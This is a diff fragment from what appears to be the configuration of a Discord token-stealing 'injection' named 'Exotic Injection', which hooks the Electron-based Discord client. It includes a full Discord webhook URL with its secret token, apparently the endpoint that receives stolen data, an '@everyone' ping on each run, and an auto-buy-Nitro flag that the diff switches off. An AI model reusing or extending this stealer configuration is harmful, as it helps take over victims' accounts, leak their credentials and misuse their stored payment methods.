@@ -8,7 +8,7 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: 'https://discord.com/api/webhooks/1136479478260957234/3qUlcczRwvnZ6jfllhUSR5kQTW1wjShxvmloleuiq9r8q8qI75FZkgizKDzHPFqEmg62', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: true, 
+  auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Exotic Injection', 
